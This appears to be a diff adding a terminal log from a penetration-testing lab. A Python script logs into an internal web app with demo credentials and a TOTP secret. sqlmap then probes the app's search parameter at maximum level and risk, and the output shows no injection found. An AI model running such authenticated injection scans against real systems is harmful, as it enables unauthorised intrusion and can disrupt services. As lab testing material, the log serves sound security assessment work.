@@ -1,0 +1,42 @@
+$ docker run --rm --network vaurora_cloud -v <repo>/secrets/lab/demo_users.json:/lab/demo_users.json:ro --entrypoint sh vaurora/attacker:1.0 -c python3 - <<'PY' > /tmp/c
+
+import json,re,pyotp,requests
+u=json.load(open('/lab/demo_users.json'))['auditor.demo']
+b='http://10.60.0.21:8000';h={'X-Forwarded-Proto':'https'}
+first=requests.get(b+'/login',headers=h)
+t=re.search(r'name="csrf" value="([^"]+)"',first.text).group(1)
+# Plain HTTP inside the cloud segment: the Secure cookie is passed by hand.
+r=requests.post(b+'/login',data=dict(csrf=t,username='auditor.demo',password=u['password'],totp=pyotp.TOTP(u['totp_secret']).now()),cookies={'session':first.cookies['session']},headers=h,allow_redirects=False)
+print(r.cookies['session'])
+
+PY
+echo baseline_http=$(curl -s -o /tmp/b -w '%{http_code}' -H "Cookie: session=$(cat /tmp/c)" 'http://10.60.0.21:8000/history?q=escola') baseline_auth=$(grep -c 'Últimos' /tmp/b); sqlmap -u 'http://10.60.0.21:8000/history?q=escola' --cookie "session=$(cat /tmp/c)" -p q --headers='X-Forwarded-Proto: https' --batch --level 5 --risk 3 --technique=BEUST --flush-session --output-dir=/tmp/s 2>&1 | tail -25
+[exit 0]
+baseline_http=200 baseline_auth=1
+[19:43:28] [INFO] testing 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)'
+[19:43:28] [INFO] testing 'Informix time-based blind - Parameter replace (heavy query)'
+[19:43:28] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[19:43:28] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
+[19:43:28] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[19:43:28] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[19:43:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)'
+[19:43:28] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[19:43:28] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+[19:43:28] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[19:43:28] [INFO] testing 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[19:43:28] [INFO] testing 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[19:43:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:43:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[19:43:28] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[19:43:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[19:43:29] [WARNING] GET parameter 'q' does not seem to be injectable
+[19:43:29] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
+[19:43:29] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 8919 times
+[19:43:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/tmp/s/results-11052026_0742pm.csv'
+
+[*] ending @ 19:43:29 /2026-11-05/
+
+
+
